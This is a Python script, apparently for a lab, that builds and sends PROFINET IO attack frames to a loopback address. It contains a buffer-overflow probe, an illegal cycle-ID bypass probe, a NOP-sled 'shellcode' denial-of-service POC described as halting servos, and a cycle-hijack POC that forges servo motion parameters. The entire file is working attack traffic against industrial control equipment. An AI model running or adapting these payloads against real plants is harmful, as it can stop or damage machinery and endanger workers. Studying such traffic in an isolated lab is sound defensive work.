from pn_base import *

DEST = LOOPBACK_DST

# 漏洞1：IO缓冲区溢出探测（大量0x41填充）
def scan_io_overflow():
    overflow_payload = b"A" * 4096
    frame = build_pn_rt_frame(cycle_id=10, io_len=len(overflow_payload), payload=overflow_payload)
    send_pn_pkt(DEST, sport=51010, full_frame=frame)
    PNLog.warn("PROFINET原生漏洞探测：超长IO载荷缓冲区溢出扫描包（0x41填充）")

# 漏洞2：周期ID越权探测
def scan_cycle_bypass():
    # 超大非法周期ID，绕过周期防护逻辑
    bad_payload = struct.pack(">ff", 0, 0)
    frame = build_pn_rt_frame(cycle_id=0xFFFF, io_len=len(bad_payload), payload=bad_payload)
    send_pn_pkt(DEST, sport=51011, full_frame=frame)
    PNLog.warn("PROFINET原生漏洞探测：非法超大周期ID越权访问扫描包")

# POC1：溢出完整攻击载荷
def poc_io_overflow_dos():
    shellcode = b"\x90"*256 + b"\xff\xff\xff\xff"
    exp_frame = build_pn_rt_frame(cycle_id=11, io_len=len(shellcode), payload=shellcode)
    send_pn_pkt(DEST, sport=51012, full_frame=exp_frame)
    PNLog.exploit("PROFINET DOS攻击POC：IO缓冲区溢出，伺服停机拒绝服务")

# POC2：周期劫持攻击POC
def poc_cycle_hijack():
    hijack_data = struct.pack(">ff", 99999.0, -100.0)
    exp_frame = build_pn_rt_frame(cycle_id=0xFFFF, io_len=len(hijack_data), payload=hijack_data)
    send_pn_pkt(DEST, sport=51013, full_frame=exp_frame)
    PNLog.exploit("PROFINET周期劫持POC：伪造周期篡改伺服运动参数")

if __name__ == "__main__":
    print("===== PROFINET_IO 原生漏洞扫描 + POC攻击流量生成 =====")
    scan_io_overflow()
    scan_cycle_bypass()
    poc_io_overflow_dos()
    poc_cycle_hijack()
    print("===== 攻击流量发送完毕，Wireshark过滤 udp.port == 34964 查看恶意报文 =====\n")